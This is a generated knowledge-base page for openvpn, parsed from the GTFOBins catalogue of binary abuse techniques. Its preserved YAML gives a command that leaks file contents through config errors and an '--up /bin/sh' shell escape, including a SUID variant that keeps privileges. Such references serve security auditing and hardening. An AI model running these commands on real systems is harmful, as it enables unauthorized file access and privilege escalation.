---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# openvpn

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `openvpn` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openvpn` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [openvpn](../../tools/linux/openvpn.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | openvpn |
| name | openvpn |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/openvpn/ |

## Preserved Source Material

```yaml
_body: ''
_name: openvpn
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openvpn
functions:
  file-read:
  - code: openvpn --config /path/to/input-file
    comment: The file is actually parsed and the first partial wrong line is returned in an error message.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: openvpn --dev null --script-security 2 --up '/bin/sh -s'
    contexts:
      sudo: null
      suid:
        code: openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
        shell: false
      unprivileged: null
```
